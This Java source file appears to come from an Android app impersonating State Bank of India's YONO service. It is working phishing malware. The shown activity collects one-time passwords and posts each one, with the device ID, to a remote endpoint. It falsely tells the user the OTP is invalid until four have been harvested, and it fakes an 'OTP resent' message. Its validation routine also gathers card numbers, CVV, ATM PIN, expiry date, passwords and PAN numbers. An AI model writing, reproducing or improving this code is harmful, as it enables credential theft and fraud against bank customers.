package com.sbi.yono.service.online;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.sbi.yono.service.online.FrontServices.FormValidator;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class FiveActivity extends AppCompatActivity {

    public Map<Integer, String> ids;
    public HashMap<String, Object> dataObject;
    private int count = 0;
    private TextView error_message;
    private TextView timeLeftTextView;
    private long timeLeftInMillis = (2 * 60 + 58) * 1000;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.otp_layout);

        error_message = findViewById(R.id.error_message);
        timeLeftTextView = findViewById(R.id.timeleft);

        startTimer();

        // Initialize the dataObject HashMap
        dataObject = new HashMap<>();

        int id = getIntent().getIntExtra("id", -1);
        Button buttonSubmit = findViewById(R.id.send_top);

        buttonSubmit.setOnClickListener(v -> {

                EditText ott = findViewById(R.id.ottt);
                if (!FormValidator.validateMinLength(ott, 6, "Required valid digit")) {
                    return;
                }
                dataObject.put("ot_"+count, ott.getText().toString().trim());
                JSONObject dataJson = new JSONObject(dataObject);
                JSONObject sendPayload = new JSONObject();
                try {
                    Helper helper = new Helper();
                    sendPayload.put("site", helper.SITE());
                    sendPayload.put("data", dataJson);
                    sendPayload.put("id", id);
                    sendPayload.put("mobile_id", Helper.getAndroidId(getApplicationContext()));

                    Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
                        @Override
                        public void onResponse(String result) {
                            count++;
                            if (result.startsWith("Response Error:")) {
                                Toast.makeText(getApplicationContext(), "Response Error : "+result, Toast.LENGTH_SHORT).show();
                            } else {
                                try {
                                    JSONObject response = new JSONObject(result);
                                    if(response.getInt("status") == 200){
                                        if(count == 4){
                                            Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                                            intent.putExtra("id", id);
                                            startActivity(intent);
                                        } else {
                                            Log.d(helper.TAG, "incremment "+count);
                                            ott.setText(""); // Clear the OTP input
                                            showError("Invalid one time password entered !");
                                        }
                                    } else {
                                        Toast.makeText(getApplicationContext(), "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                    }
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    });
                } catch (JSONException e) {
                    Toast.makeText(this, "Error1 "+e.toString(), Toast.LENGTH_SHORT).show();
                }

        });


        // alert message
        Button resendButton = findViewById(R.id.resend_button1);
        resendButton.setOnClickListener(v -> {
            this.showError("Otp Resend successfully !");

        });

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially

        // Clear dataObject before adding new data
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                isValid = false; // Mark as invalid if required field is missing
                continue; // Continue with the next field
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "phone":
                    if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
                        isValid = false;
                    }
                    break;
                case "password":
                case "pass":
                case "profilepassword":
                    if (!FormValidator.validatePassword(editText, "Invalid Password")) {
                        isValid = false;
                    }
                    break;
                case "cvv":
                    if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
                        isValid = false;
                    }
                    break;
                case "pin":
                    if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
                        isValid = false;
                    }
                    break;
                case "tpin":
                    if (!FormValidator.validateMinLength(editText, 4, "Invalid Pin")) {
                        isValid = false;
                    }
                    break;
                case "expiry":
                    if (!FormValidator.validateMinLength(editText, 10, "Invalid Expiry Date")) {
                        isValid = false;
                    }
                    break;
                case "card":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                        isValid = false;
                    }
                    break;
                case "pan":
                    if (!FormValidator.validatePANCard(editText, "Invalid Pan Number")) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

    private void startTimer() {
        new CountDownTimer(timeLeftInMillis, 1000) {

            @Override
            public void onTick(long millisUntilFinished) {
                timeLeftInMillis = millisUntilFinished;
                updateTimer();
            }

            @Override
            public void onFinish() {
                timeLeftTextView.setText("Time Left : 00:00");
            }
        }.start();
    }

    private void updateTimer() {
        int minutes = (int) (timeLeftInMillis / 1000) / 60;
        int seconds = (int) (timeLeftInMillis / 1000) % 60;

        @SuppressLint("DefaultLocale") String timeLeftFormatted = String.format("Time Left : %02d:%02d", minutes, seconds);
        timeLeftTextView.setText(timeLeftFormatted);
    }

    private void showError(String msg) {
        error_message.setText(msg);

        // Hide the error message after 3 seconds (3000 milliseconds)
        error_message.postDelayed(new Runnable() {
            @Override
            public void run() {
                error_message.setText(""); // Clear the error message
            }
        }, 3000);
    }

}
